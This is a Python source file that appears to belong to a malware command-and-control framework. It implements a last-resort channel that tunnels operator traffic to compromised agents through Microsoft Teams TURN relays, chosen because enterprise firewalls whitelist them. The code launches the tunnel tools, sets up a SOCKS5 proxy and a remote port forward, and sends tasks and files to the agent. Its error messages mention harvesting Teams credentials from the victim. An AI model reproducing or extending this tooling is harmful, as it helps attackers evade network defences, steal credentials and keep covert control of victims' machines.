"""
c2/transport/turnt_transport — TURN-tunnel C2 transport. Priority 2.

How this fits into the C2 architecture
───────────────────────────────────────
Telegram (priority 0) → Discord (priority 1) → TURN/turnt (priority 2)

When Telegram AND Discord are both unreachable (enterprise firewall blocking
both api.telegram.org and discord.com), turnt activates as the last-resort
egress path using Microsoft Teams TURN relay servers
(*.relay.teams.microsoft.com:443 — almost universally whitelisted).

Transport topology once tunnel is live
───────────────────────────────────────
  Agent (turnt-relay) ──DTLS/SCTP/TURN──► Operator (turnt-control)
                                               │
                                        SOCKS5 :1080
                                        rportfwd: agent:localhost:4443
                                               │
                                   HTTPS C2 listener :4443

Agent's PS beacon targets https://127.0.0.1:4443 (remote port forward).
Traffic: agent → turnt data channel → operator's HTTPS C2.

C2 messages use the same JSON wire protocol (TASK / ACK / CHECKIN) but
delivered over the HTTPS listener that is now tunnel-reachable.

Lifecycle
───────────────────────────────────────
1. connect():
   - Launch turnt-control -config <creds.yaml> subprocess
   - Read base64 SDP offer from stdout
   - Store offer; raise TurntAwaitingAnswer (not a full error — just "waiting")
2. submit_answer(answer: str):
   - Write answer to turnt-control stdin → tunnel established
   - Launch turnt-admin to set up remote port forward (agent:4443 → local:4443)
   - self._alive = True
3. send() / listen():
   - Route through the HTTPS transport proxy-chained over SOCKS5:1080
"""
from __future__ import annotations

import asyncio
import logging
import subprocess
import threading
import time
from pathlib import Path
from typing import AsyncIterator

from fitnah.c2.transport.base import AbstractTransport
from fitnah.builder.turnt import TurntBuilder

log = logging.getLogger(__name__)

# Local ports used by the turnt stack on the operator machine
SOCKS5_PORT   = 1080   # turnt-control SOCKS5 proxy
C2_LOCAL_PORT = 4443   # HTTPS C2 port (agent → turnt → here)


class TurntAwaitingAnswer(Exception):
    """Raised by connect() when the SDP offer is ready but answer not yet received."""
    def __init__(self, offer: str):
        self.offer = offer
        super().__init__("Awaiting SDP answer from agent")


class TurntTransport(AbstractTransport):
    """
    TURN-tunnel C2 channel using turnt-control as a managed subprocess.
    Priority=2 (last-resort failover after Telegram and Discord).
    """

    name     = "turnt"
    priority = 2

    def __init__(
        self,
        creds_path: str | Path | None = None,
        socks5_port: int = SOCKS5_PORT,
        c2_local_port: int = C2_LOCAL_PORT,
        control_bin: str | Path | None = None,
        admin_bin: str | Path | None = None,
    ):
        self._creds_path    = Path(creds_path) if creds_path else None
        self._socks5_port   = socks5_port
        self._c2_local_port = c2_local_port
        self._alive         = False
        self._pending_offer: str = ""
        self._control_proc: subprocess.Popen | None = None
        self._admin_proc:   subprocess.Popen | None = None
        self._msg_queue: asyncio.Queue = asyncio.Queue()
        self._loop: asyncio.AbstractEventLoop | None = None

        # Resolve operator-side binary paths from bundled assets
        tb = TurntBuilder()
        self._control_bin = Path(control_bin) if control_bin else tb.operator_tool("control")
        self._admin_bin   = Path(admin_bin)   if admin_bin   else tb.operator_tool("admin")

        if not self._control_bin or not self._control_bin.exists():
            log.warning("[turnt] turnt-control binary not found — transport disabled")

    # ── lifecycle ─────────────────────────────────────────────────────────────

    async def connect(self) -> None:
        """
        Launch turnt-control, read the SDP offer, then raise TurntAwaitingAnswer.
        The caller (Router or console) must catch TurntAwaitingAnswer, send the
        offer to the agent via a working transport, receive the answer, and call
        submit_answer(answer).
        """
        if not self._control_bin or not self._control_bin.exists():
            raise RuntimeError(
                "turnt-control binary not found. "
                "Run: builder -f turnt-relay --list  to check assets."
            )

        if not self._creds_path or not self._creds_path.exists():
            raise RuntimeError(
                f"TURN credentials file not found: {self._creds_path}\n"
                "Run: tunnel creds  (harvests Teams creds from agent)\n"
                "  or: turnt-credentials msteams -o creds.yaml  on operator machine"
            )

        self._loop = asyncio.get_running_loop()
        log.info("[turnt] Launching turnt-control -config %s", self._creds_path)

        self._control_proc = subprocess.Popen(
            [str(self._control_bin), "-config", str(self._creds_path)],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
        )

        # Read offer from stdout (turnt-control prints "Offer: <base64>\n")
        offer = await asyncio.get_event_loop().run_in_executor(
            None, self._read_offer_from_control
        )

        if not offer:
            stderr = self._control_proc.stderr.read() if self._control_proc.stderr else ""
            raise RuntimeError(f"turnt-control did not produce an offer.\nSTDERR: {stderr}")

        self._pending_offer = offer
        log.info("[turnt] SDP offer ready (%d chars)", len(offer))
        raise TurntAwaitingAnswer(offer)

    def _read_offer_from_control(self, timeout: float = 30.0) -> str:
        """Block-read turnt-control stdout until we see 'Offer: <base64>' line."""
        deadline = time.time() + timeout
        proc = self._control_proc
        if not proc or not proc.stdout:
            return ""
        while time.time() < deadline:
            line = proc.stdout.readline()
            if not line:
                time.sleep(0.1)
                continue
            line = line.strip()
            log.debug("[turnt-control] %s", line)
            if line.startswith("Offer:"):
                return line[6:].strip()
            # Also accept standalone base64 blob >= 100 chars
            if len(line) >= 100 and all(
                c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
                for c in line
            ):
                return line
        return ""

    def submit_answer(self, answer: str) -> None:
        """
        Feed the SDP answer (received from agent via turnt_relay plugin) back
        into turnt-control to complete the WebRTC handshake.
        """
        if not self._control_proc or not self._control_proc.stdin:
            raise RuntimeError("turnt-control is not running")

        log.info("[turnt] Submitting SDP answer (%d chars)", len(answer))
        self._control_proc.stdin.write(answer + "\n")
        self._control_proc.stdin.flush()

        # Give turnt-control time to establish the tunnel
        time.sleep(3)

        # Check process is still alive
        if self._control_proc.poll() is not None:
            stderr = self._control_proc.stderr.read() if self._control_proc.stderr else ""
            raise RuntimeError(f"turnt-control exited after answer submission.\nSTDERR: {stderr}")

        # Set up remote port forward: agent:localhost:C2_PORT → operator:C2_PORT
        self._setup_rportfwd()
        self._alive = True
        log.info("[turnt] Tunnel live. SOCKS5 on :%d, C2 rportfwd on agent:127.0.0.1:%d",
                 self._socks5_port, self._c2_local_port)

        # Start reader thread
        t = threading.Thread(target=self._stdout_reader, daemon=True)
        t.start()

    def _setup_rportfwd(self) -> None:
        """
        Use turnt-admin to configure a remote port forward so the agent's
        localhost:C2_PORT → operator's localhost:C2_PORT.
        This lets the agent's HTTPS beacon target https://127.0.0.1:<port>.
        """
        if not self._admin_bin or not self._admin_bin.exists():
            log.warning("[turnt] turnt-admin not found — skipping remote port forward setup")
            return
        try:
            cmd = [
                str(self._admin_bin),
                "rportfwd", "add",
                f"127.0.0.1:{self._c2_local_port}",
                f"127.0.0.1:{self._c2_local_port}",
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                log.info("[turnt] Remote port forward set: agent:127.0.0.1:%d → operator:127.0.0.1:%d",
                         self._c2_local_port, self._c2_local_port)
            else:
                log.warning("[turnt] rportfwd setup failed: %s", result.stderr)
        except Exception as ex:
            log.warning("[turnt] rportfwd setup exception: %s", ex)

    def _stdout_reader(self) -> None:
        """Background thread: read messages piped over turnt data channel → queue."""
        proc = self._control_proc
        if not proc or not proc.stdout:
            return
        for line in proc.stdout:
            line = line.strip()
            if line:
                log.debug("[turnt-msg] %s", line)
                if self._loop:
                    asyncio.run_coroutine_threadsafe(
                        self._msg_queue.put({"text": line, "_transport": "turnt",
                                             "chat_id": "turnt", "sender_id": "agent"}),
                        self._loop,
                    )

    async def disconnect(self) -> None:
        self._alive = False
        for proc in [self._control_proc, self._admin_proc]:
            if proc and proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
        self._control_proc = None
        self._admin_proc   = None
        log.info("[turnt] Disconnected")

    # ── send ──────────────────────────────────────────────────────────────────

    async def send(self, chat_id: str, text: str) -> None:
        """
        Send a C2 message through the HTTPS C2 endpoint tunnelled via turnt.
        The HTTPS C2 listener must be running on localhost:C2_LOCAL_PORT.
        """
        if not self._alive:
            raise RuntimeError("Turnt tunnel not established")
        try:
            import httpx
            # Route through SOCKS5 proxy that turnt-control exposes
            proxies = {
                "http://":  f"socks5://127.0.0.1:{self._socks5_port}",
                "https://": f"socks5://127.0.0.1:{self._socks5_port}",
            }
            async with httpx.AsyncClient(proxies=proxies, verify=False, timeout=15) as client:
                await client.post(
                    f"https://127.0.0.1:{self._c2_local_port}/c2/task",
                    json={"chat_id": chat_id, "text": text},
                )
        except Exception as ex:
            log.error("[turnt] send failed: %s", ex)
            raise

    async def send_file(self, chat_id: str, filename: str, data: bytes, caption: str = "") -> None:
        if not self._alive:
            raise RuntimeError("Turnt tunnel not established")
        try:
            import httpx
            proxies = {
                "http://":  f"socks5://127.0.0.1:{self._socks5_port}",
                "https://": f"socks5://127.0.0.1:{self._socks5_port}",
            }
            async with httpx.AsyncClient(proxies=proxies, verify=False, timeout=30) as client:
                await client.post(
                    f"https://127.0.0.1:{self._c2_local_port}/c2/file",
                    files={"file": (filename, data)},
                    data={"chat_id": chat_id, "caption": caption},
                )
        except Exception as ex:
            log.error("[turnt] send_file failed: %s", ex)
            raise

    async def send_photo(self, chat_id: str, data: bytes, caption: str = "") -> None:
        await self.send_file(chat_id, "photo.png", data, caption)

    # ── listen ────────────────────────────────────────────────────────────────

    async def listen(self) -> AsyncIterator[dict]:
        while self._alive:
            try:
                msg = await asyncio.wait_for(self._msg_queue.get(), timeout=5.0)
                yield msg
            except asyncio.TimeoutError:
                continue
            except Exception as ex:
                log.error("[turnt] listen error: %s", ex)
                break

    # ── status ────────────────────────────────────────────────────────────────

    @property
    def is_alive(self) -> bool:
        if not self._alive:
            return False
        if self._control_proc and self._control_proc.poll() is not None:
            self._alive = False
            return False
        return True

    @property
    def pending_offer(self) -> str:
        return self._pending_offer

    def status(self) -> str:
        if self.is_alive:
            return f"alive (SOCKS5 :{self._socks5_port}, rportfwd :{self._c2_local_port})"
        if self._pending_offer:
            return f"awaiting answer ({len(self._pending_offer)} char offer ready)"
        return "dead"
